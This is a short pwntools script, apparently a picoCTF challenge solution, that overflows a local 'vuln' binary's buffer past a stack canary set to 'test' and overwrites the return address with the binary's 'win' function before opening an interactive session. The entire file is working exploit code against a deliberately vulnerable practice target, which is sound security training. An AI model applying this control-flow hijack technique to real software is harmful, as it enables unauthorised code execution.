from pwn import *

context.update(arch='i386', os='linux', endian='little') #context acquired from file command

elf =  ELF("./vuln")
# p = remote("saturn.picoctf.net", 63569) #ports vary between different instances launched
p = elf.process()

offset = 64
offset_after_canary = 16

#local version, with known canary
payload = [
    b"A"*offset,
    b"test", #canary
    b"A"*offset_after_canary,
    pack(elf.symbols['win'])
]

# payload = [
#     b"A"*offset,
#     b"test", #canary
#     b"A"*offset_after_canary,
#     pack(elf.symbols['win'])
# ]

p.sendline(b"1000")
p.sendline(b"".join(payload))

p.interactive()
p.close()